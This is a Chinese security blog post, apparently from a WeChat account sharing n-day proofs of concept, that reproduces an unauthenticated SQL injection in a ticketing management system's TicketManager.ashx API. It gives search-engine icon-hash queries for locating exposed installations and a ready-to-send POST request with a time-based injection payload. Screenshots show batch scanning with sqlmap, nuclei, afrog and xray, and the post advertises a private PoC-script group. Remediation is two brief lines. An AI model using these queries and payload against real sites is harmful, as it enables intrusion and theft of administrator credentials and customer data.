#  【漏洞复现】某成科信票务管理系统 TicketManager.ashx SQL注入漏洞   
Superhero  Nday Poc   2024-08-25 19:38  
  
**0x00 免责声明**  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
**0x01 产品简介**  
  
  
某成科信票务管理系统是专注于演出剧院、体育场馆、旅游景区、游乐园、场地活动的票务管理系统,并为特殊客户量身定制票务应用解决方案，可根据用户的要求采用不同的技术载体实现门票的防伪：二维条码门票防伪技术、RFID电子门票防伪技术、手机二维码门票技术、变温微缩文字荧光等防伪票纸技术。根据票务系统应用环境的不同,系统的检票环节可定制为全自动闸机检票、手持终端机检票、无色荧光检测器等检票方式,也可多种方式并存。  
  
**0x02 漏洞概述**  
  
  
某成科信票务管理系统 TicketManager.ashx 接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。  
  
**0x03 搜索引擎**  
```
icon_hash="1632964065" || icon_hash="-2142050529"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKOmScwnqdicemLJnUHW9ho1HbJ9RDoIReXbBXj8lNkxj9iaDTiaXkp0esbIia5hSajJicNVNFIPwaN60A/640?wx_fmt=png&from=appmsg "")  
  
  
**0x04 漏洞复现**  
```
POST /SystemManager/Api/TicketManager.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: application/x-www-form-urlencoded
Connection: close
 
Method=GetReServeOrder&solutionId=1' WAITFOR DELAY '0:0:5'--
```  
  
‍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKOmScwnqdicemLJnUHW9ho1tJFfd9KTfddtsROT2pX7qGFnXyNN3Oz5PRkiaOjLiboiaRUkHiao02T1TA/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKOmScwnqdicemLJnUHW9ho1XUxRtoE7dVzfexeLUqErhmy87f4PcRb0d6377KjGIQw9v9oK6EEt8w/640?wx_fmt=png&from=appmsg "")  
  
  
**0x05 工具批量**  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKOmScwnqdicemLJnUHW9ho1a3q0Pv9b5X3BklPp3UkoOMm9rj17lmEIt6x32T7tc3S6Ne6AkY1Wibw/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKOmScwnqdicemLJnUHW9ho1HjcofmXKAuNk22eHCE7d9BTq0F8BicnoMo0UlDicINCeHqtl10Qibjuqw/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKOmScwnqdicemLJnUHW9ho1PcnracRrRp6PWXtpU2Kyky2UsLTPH8NzfKuSCYjLKGFUrtdz0LMd3Q/640?wx_fmt=png&from=appmsg "")  
  
POC脚本获取  
  
请使用VX扫一扫加入内部  
POC脚本分享圈子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
**0x06 修复建议**  
  
1、关闭互联网暴露  
面或接口设置访问权限  
  
2、⼚商已发布了漏洞修复程序，请及时关注更新：  
  
http://zckx.yyalf.com/  
  
